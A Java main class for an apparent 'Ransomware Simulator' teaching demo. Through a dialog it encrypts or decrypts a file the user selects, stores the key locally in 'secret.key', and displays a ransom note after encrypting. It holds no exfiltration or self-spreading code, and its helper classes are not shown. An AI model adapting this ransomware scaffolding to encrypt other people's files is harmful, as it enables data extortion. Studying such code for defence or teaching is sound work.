package ransomware.com;

import javax.crypto.SecretKey;
import javax.swing.*;

public class Main {

    public static void main(String[] args) {
        try {
            FileSelector fileSelector = new FileSelector();
            String filePath = fileSelector.selectFile();

            if (filePath != null) {
                int option = JOptionPane.showOptionDialog(null,
                        "Choose an option",
                        "Ransomware Simulator",
                        JOptionPane.DEFAULT_OPTION,
                        JOptionPane.INFORMATION_MESSAGE,
                        null,
                        new String[]{"Encrypt", "Decrypt"},
                        "Encrypt");

                FileEncryptor fileEncryptor = new FileEncryptor();

                if (option == 0) {  // Encryption
                    if (!filePath.endsWith(".encrypted")) {
                        fileEncryptor.generateKey();
                        fileEncryptor.encryptFile(filePath);

                        KeyStorage keyStorage = new KeyStorage();
                        keyStorage.saveKey(fileEncryptor.getSecretKey(), "secret.key");

                        RansomNote ransomNote = new RansomNote();
                        ransomNote.displayRansomNote();
                    } else {
                        JOptionPane.showMessageDialog(null, "File is already encrypted!");
                    }

                } else if (option == 1) {  // Decryption
                    if (filePath.endsWith(".encrypted")) {
                        KeyStorage keyStorage = new KeyStorage();
                        SecretKey secretKey = keyStorage.loadKey("secret.key");

                        fileEncryptor.decryptFile(filePath, secretKey);
                        JOptionPane.showMessageDialog(null, "File decrypted successfully!");
                    } else {
                        JOptionPane.showMessageDialog(null, "File is already decrypted or not an encrypted file!");
                    }

                } else {
                    System.out.println("Operation canceled.");
                }
            } else {
                System.out.println("No file selected.");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
